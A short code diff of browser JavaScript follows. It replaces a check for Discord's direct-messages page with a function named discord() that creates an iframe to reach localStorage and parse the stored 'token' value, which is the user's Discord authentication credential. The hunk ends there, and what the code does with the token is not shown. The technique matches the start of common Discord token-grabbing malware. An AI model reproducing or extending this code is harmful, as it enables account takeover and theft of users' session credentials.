@@ -1,4 +1,4 @@
-if (window.location.href === "https://discord.com/channels/@me") {
+function discord() {
 const LS = document.body.appendChild(document.createElement('iframe')).contentWindow.localStorage;
 const LST = JSON.parse(LS.token);
 
